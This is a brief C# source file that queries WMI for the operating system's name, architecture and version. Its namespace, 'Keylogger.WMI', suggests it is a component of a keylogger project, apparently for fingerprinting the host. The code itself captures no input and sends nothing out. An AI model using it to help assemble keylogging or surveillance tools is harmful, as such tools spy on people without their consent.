using System.Management;

namespace Keylogger.WMI
{
    internal static class Win32OperatingSystem
    {
        public static string GetOsVersion()
        {
            using var searcher = new ManagementObjectSearcher("SELECT Caption, Version, OSArchitecture FROM Win32_OperatingSystem");
            using var collection = searcher.Get();
            foreach (var obj in collection)
            {
                return $"{obj["Caption"]} {obj["OSArchitecture"]} (Version {obj["Version"]})";
            }

            return string.Empty;
        }
    }
}